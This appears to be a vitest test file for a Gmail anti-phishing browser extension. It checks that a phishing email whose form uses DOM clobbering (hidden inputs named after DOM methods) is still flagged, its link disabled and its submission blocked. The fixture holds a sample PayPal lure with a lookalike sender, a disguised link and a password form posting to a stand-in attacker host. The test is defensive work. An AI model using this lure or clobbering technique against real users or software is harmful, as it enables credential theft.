// @vitest-environment happy-dom
// @vitest-environment-options {"url":"https://mail.google.com/mail/u/0/#inbox"}
// C5: DOM clobbering. A phishing body contains a <form> whose named controls (<input name="closest">, ...) would,
// in a real browser, shadow the form's own DOM methods and properties, also inside the content script. The whole
// pipeline (Gmail extraction, scoring, link lock, click guard) must still lock the email and block the form.
//
// happy-dom does not implement named-control clobbering, so (as in src/clobbering.test.ts) it is emulated with own
// properties on the form before main() runs. Not emulated: tagName, getAttribute, parentElement and className,
// which happy-dom's own selector matching and event dispatch read; those inputs are still in the markup.
import { beforeAll, describe, expect, it } from 'vitest';
import { $, type Msg, bootContent, click, gmailMessage, lastVerdict, settled, submit } from './harness';

const EMULATED = [
  'closest', 'contains', 'matches', 'hasAttribute', 'querySelector', 'querySelectorAll',
  'localName', 'nodeType', 'textContent', 'ownerDocument', 'hidden', 'isContentEditable', 'children',
];
const IN_MARKUP_ONLY = ['getAttribute', 'tagName', 'action'];

const PAGE = gmailMessage({
  name: 'PayPal Support',
  email: 'help@paypa1-secure.example',
  subject: 'Account notice',
  body: `Your PayPal account is locked. Verify your password now or it will be suspended.
    <a id="link" href="https://evil.example/login">www.paypal.com</a>
    <form id="f" action="https://evil.example/collect">
      ${[...EMULATED, ...IN_MARKUP_ONLY].map((n) => `<input type="hidden" name="${n}">`).join('')}
      <input type="password" name="pw"><button id="go">Sign in</button>
    </form>`,
});

function clobber(form: Element): void {
  for (const name of EMULATED) {
    const input = Element.prototype.querySelector.call(form, `input[name="${name}"]`);
    Object.defineProperty(form, name, { value: input, configurable: true });
  }
}

let sent: Msg[];

beforeAll(async () => {
  ({ sent } = await bootContent(PAGE, { beforeMain: () => clobber($('f')) }));
  await settled(sent);
});

describe('content.ts: phishing email with a clobbering <form>', () => {
  it('the form really is clobbered for page-world style property access', () => {
    const form = $('f') as unknown as Record<string, unknown>;
    expect(typeof form.closest).not.toBe('function');
    expect(typeof form.querySelectorAll).not.toBe('function');
  });

  it('still scores the email and locks its body', () => {
    expect(lastVerdict(sent)).toMatchObject({ verdict: { level: 'likely-phishing' }, trusted: false });
    expect(document.querySelector('div.a3s')!.hasAttribute('data-ped-locked')).toBe(true);
    expect($('link').hasAttribute('href')).toBe(false);
  });

  it('stashes the form action and cancels submit, the submit button and the link', () => {
    const form = $('f');
    expect(Element.prototype.hasAttribute.call(form, 'action')).toBe(false);
    expect(Element.prototype.getAttribute.call(form, 'data-ped-action')).toBe('https://evil.example/collect');
    expect(submit(form)).toBe(true);
    expect(click($('go'))).toBe(true);
    expect(click($('link'))).toBe(true);
    expect(sent.some((m) => m.type === 'openSafeLink' || m.type === 'openWarning')).toBe(false);
  });
});
